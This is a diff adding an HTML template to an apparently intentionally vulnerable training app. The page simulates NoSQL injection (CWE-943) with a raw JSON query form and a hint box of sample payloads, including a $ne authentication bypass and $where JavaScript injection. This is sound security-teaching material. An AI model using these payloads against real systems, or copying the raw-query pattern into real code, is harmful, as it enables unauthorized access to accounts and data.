@@ -1,0 +1,46 @@
+{% extends "base.html" %}
+
+{% block title %}NoSQL Injection - Vulnerable App{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>🍃 NoSQL Injection (Simulated)</h2>
+    <span class="vulnerability-tag">HIGH</span>
+    <span class="vulnerability-tag">CWE-943</span>
+    
+    <p>This simulates a NoSQL injection vulnerability (like MongoDB).</p>
+    
+    <form method="POST" style="margin-top: 1rem;">
+        <label for="query">Query (JSON):</label>
+        <textarea id="query" name="query" rows="4" placeholder='{"username": "admin"}'></textarea>
+        <button type="submit">Execute Query</button>
+    </form>
+    
+    {% if result %}
+    <div class="result">
+        <h3>Result:</h3>
+        <pre>{{ result }}</pre>
+    </div>
+    {% endif %}
+    
+    <div class="hint">
+        <strong>💡 NoSQL Injection Payloads:</strong>
+        <pre>
+// Authentication bypass
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+
+// Always true condition
+{"$where": "1 == 1"}
+
+// Regex-based injection
+{"username": {"$regex": "^admin"}}
+
+// Extract data via $gt/$lt
+{"password": {"$gt": ""}}
+
+// JavaScript injection
+{"$where": "this.password.length > 0"}
+        </pre>
+    </div>
+</div>
+{% endblock %}
